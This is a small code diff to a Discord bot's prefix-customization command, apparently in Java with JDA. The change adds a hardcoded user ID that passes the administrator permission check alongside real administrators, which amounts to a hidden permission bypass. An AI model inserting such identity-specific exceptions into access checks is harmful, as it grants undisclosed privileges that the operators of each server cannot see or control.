@@ -15,7 +15,7 @@ public class PrefixCustomizer implements Command {
     private long guildID = 0;
 
     public boolean called(String[] args, MessageReceivedEvent event) {
-        if (event.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) {
+        if (event.getMember().getPermissions().contains(Permission.ADMINISTRATOR) || event.getMember().getUser().getIdLong() == 279184766140678145L) {
             return false;
         } else {
             return true;
